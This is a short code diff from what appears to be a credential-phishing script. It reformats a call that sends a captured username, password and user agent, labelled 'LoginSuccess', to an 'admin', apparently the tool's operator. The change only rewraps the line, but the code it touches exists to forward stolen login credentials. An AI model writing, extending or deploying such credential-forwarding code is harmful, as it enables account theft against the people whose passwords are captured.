@@ -64,7 +64,9 @@ if __name__ == "__main__":
             title = 'LoginSuccess'
 
         sen2Admin(
-            '<b>'+title+':</b> '+status+'\n<b>Username:</b> '+username+'\n<b>Password:</b> '+password+'\n<b>Useragent:</b> '+useragent)
+            '<b>'+title+':</b> '+status+'\n<b>Username:</b> '+username +
+            '\n<b>Password:</b> '+password+'\n<b>Useragent:</b> '+useragent
+        )
 
         print(get_timestamp(), title)
 
